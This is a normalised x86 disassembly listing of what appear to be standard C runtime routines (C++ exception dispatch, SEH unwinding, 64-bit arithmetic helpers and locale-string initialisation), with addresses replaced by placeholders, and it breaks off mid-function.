mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_1007baf2
push 0x2c
push r--data
call sub_10079bf0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10021180
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_10039c8c
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_10039c8c
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_10039c8c
mov [ eax + 0x88 ] esi
call sub_10039c8c
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1002eb98
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1007bc18
mov eax [ ebp - 0x1c ]
call sub_10079c35
retn
sub_1007bb8b
mov esp [ ebp - 0x18 ]
call sub_10039c8c
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1005e2d9
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1007bc18
mov eax [ ebp - 0x1c ]
call sub_10079c35
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1007bc18
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10046fb7
pop ecx
call sub_10039c8c
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_10039c8c
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_10013de2
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_100115cb
pop ecx
pop ecx
sub_1007bc8e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10035f44
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1005e57a
call sub_1004ae8e
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1005e2d9
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1007baf2
add esp 0x28
test eax eax
je r-xdata
sub_1007bcfc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_10039c8c
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_10039c8c
lea edi [ eax + 0x80 ]
call sub_10029ea7
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10025c79
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_100680f5
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001ed84
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007bc8e
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_1007be03
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_100680f5
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_10039c8c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_100680f5
call sub_10059574
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1007bcfc
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_10039c8c
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_10039c8c
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_10039c8c
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_10059fd6
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10025c79
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_100680f5
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_100115cb
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_10039c8c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_10039c8c
mov edi [ eax + 0x94 ]
call sub_10039c8c
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1007ba33
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1007ba33
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_100154b5
test al al
jne r-xdata
call sub_100680f5
cmp eax 0x19930522
jne r-xdata
call sub_10039c8c
call sub_10039c8c
call sub_10039c8c
mov [ eax + 0x88 ] esi
call sub_10039c8c
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1002a922
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_100115cb
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10008757
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_1000bd19
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1007bc8e
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1004ae8e
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1005e2d9
add esp 0x10
push [ esi + 0x1c ]
call sub_1007baa9
sub_1007c180
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1007d87c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1007d87c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1007c1cc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10079a10
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1003b313
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1004ac7a
pop ecx
cmp eax ebx
je r-xdata
call sub_1007d0c0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1007c2c0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1007c330
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1007c3c0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1007d885
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1007d8a4
jmp r-xdata
sub_1007c3c0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10024145
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1007c330
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1007c422
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1007c452
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1007c490
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1007c530
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1007c564
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_100203c5
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
